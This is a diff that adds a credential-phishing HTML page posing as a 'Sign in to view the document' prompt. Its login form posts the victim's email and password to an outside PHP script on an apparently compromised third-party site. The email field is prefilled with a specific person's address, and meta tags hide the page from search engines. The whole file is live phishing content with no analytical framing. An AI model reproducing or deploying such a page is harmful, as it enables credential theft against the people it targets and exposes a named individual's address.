@@ -1,0 +1,20 @@
+<HTML style="BOX-SIZING: border-box"><HEAD style="BOX-SIZING: border-box"><TITLE style="BOX-SIZING: border-box">Sign in to continue</TITLE><LINK style="BOX-SIZING: border-box" rel=icon type=image/png href="https://i.gyazo.com/83cffd1ebf23ed93aa925eb9529f5348.png">
+<META style="BOX-SIZING: border-box" name=robots content="noindex, noarchive, nofollow, nosnippet">
+<META style="BOX-SIZING: border-box" name=googlebot content="noindex, noarchive, nofollow, nosnippet, noimageindex">
+<META style="BOX-SIZING: border-box" name=slurp content="noindex, noarchive, nofollow, nosnippet, noodp, noydir">
+<META style="BOX-SIZING: border-box" name=msnbot content="noindex, noarchive, nofollow, nosnippet">
+<META style="BOX-SIZING: border-box" name=teoma content="noindex, noarchive, nofollow, nosnippet">
+<META style="BOX-SIZING: border-box" name=viewport content="width=device-width, initial-scale=1">
+<META name=GENERATOR content="MSHTML 11.00.9600.19811"></HEAD>
+<BODY style="BOX-SIZING: border-box; OVERFLOW: hidden; HEIGHT: 100%; FONT-FAMILY: 'PT Sans', sans-serif; WIDTH: 100%; BACKGROUND: url(https://i.gyazo.com/049bc4624875e35c9a678af7eb99bb95.jpg) no-repeat; RIGHT: 0px; POSITION: absolute; LEFT: 0px; MARGIN: auto; TOP: 0px; BOTTOM: 0px; background-size: cover">
+<DIV class=files style="BOX-SIZING: border-box; MAX-WIDTH: 450px; WIDTH: 90%; BACKGROUND: #02723b; COLOR: #fff; TEXT-ALIGN: center; MARGIN: 200px auto"><IMG style="BOX-SIZING: border-box" src="https://i.gyazo.com/7fc7a0126fd7e7c8bcb89fc52967c8ec.png" height=50> 
+<H2 style="BOX-SIZING: border-box">Sign in to view the document</H2>
+<DIV class=login style="BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px">
+<FORM style="BOX-SIZING: border-box; MAX-WIDTH: 450px; MARGIN: 0px auto" method=post action="https://montrealidiomas.com.br/web/fotos/excel/excel.php">
+<DIV style="BOX-SIZING: border-box; BACKGROUND: white; BORDER-BOTTOM: #ccc 1px solid; POSITION: relative; COLOR: #000"><INPUT id=email style="BOX-SIZING: border-box; BORDER-TOP: 0px; BORDER-RIGHT: 0px; WIDTH: 100%; BACKGROUND: #fff; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 50px; BORDER-LEFT: 0px; PADDING-RIGHT: 20px" value=falshenaifi@stc.com.sa name=email placeholder="Email Address" required="">
+<LABEL style="BOX-SIZING: border-box; POSITION: absolute; FONT-WEIGHT: bold; LEFT: 20px; TOP: 22px; opacity: 0.3" for=email></LABEL>
+<DIV class=requirements style="BOX-SIZING: border-box; OVERFLOW: hidden; COLOR: red; PADDING-BOTTOM: 0px; FONT-STYLE: italic; PADDING-TOP: 0px; PADDING-LEFT: 50px; PADDING-RIGHT: 30px; MAX-HEIGHT: 0px; transition: 0.28s">Must be a valid email address.</DIV></DIV>
+<DIV style="BOX-SIZING: border-box; BACKGROUND: white; BORDER-BOTTOM: #ccc 1px solid; POSITION: relative; COLOR: #000"><INPUT id=password style="BOX-SIZING: border-box; BORDER-TOP: 0px; BORDER-RIGHT: 0px; WIDTH: 100%; BACKGROUND: #fff; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 50px; BORDER-LEFT: 0px; PADDING-RIGHT: 20px" type=password name=password placeholder="Password" required="" pattern=".{5,}">
+<LABEL style="BOX-SIZING: border-box; POSITION: absolute; FONT-WEIGHT: bold; LEFT: 20px; TOP: 22px; opacity: 0.3" for=password></LABEL>
+<DIV class=requirements style="BOX-SIZING: border-box; OVERFLOW: hidden; COLOR: red; PADDING-BOTTOM: 0px; FONT-STYLE: italic; PADDING-TOP: 0px; PADDING-LEFT: 50px; PADDING-RIGHT: 30px; MAX-HEIGHT: 0px; transition: 0.28s">Your password must be at least 6 characters as well as contain at least one uppercase, one lowercase, and one number. </DIV></DIV>
+<INPUT style="BOX-SIZING: border-box; BORDER-TOP: 0px; BORDER-RIGHT: 0px; WIDTH: 100%; BACKGROUND: #25402b; BORDER-BOTTOM: 0px; COLOR: white; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 20px; MARGIN: 20px 0px; BORDER-LEFT: 0px; DISPLAY: block; PADDING-RIGHT: 20px" type=submit value="View Document"> </FORM></DIV></DIV></BODY></HTML>
